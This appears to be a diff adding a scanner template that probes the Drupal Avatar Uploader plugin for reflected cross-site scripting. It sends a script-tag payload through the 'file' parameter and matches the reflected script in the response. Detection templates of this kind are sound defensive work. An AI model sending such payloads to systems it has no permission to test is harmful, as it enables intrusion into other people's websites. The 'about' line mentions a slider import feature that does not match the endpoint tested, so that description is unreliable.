@@ -1,0 +1,31 @@
+id: drupal-avatar-xss
+brief:
+    title: Drupal Avatar Uploader - Cross-Site Scripting
+    by: bywalks
+    level: high
+    about: Drupal Avatar Uploader v7.x-1.0-beta8 plugin contains a cross-site scripting vulnerability in the slider import search feature and tab parameter via plugin settings.
+    label:
+        - xss
+        - drupal
+        - edb
+        - packetstorm
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/avatar_uploader.pages.inc?file=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E'
+      signs:
+        - "on": word
+          has:
+            - <div><script>alert(document.domain)</script></div>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
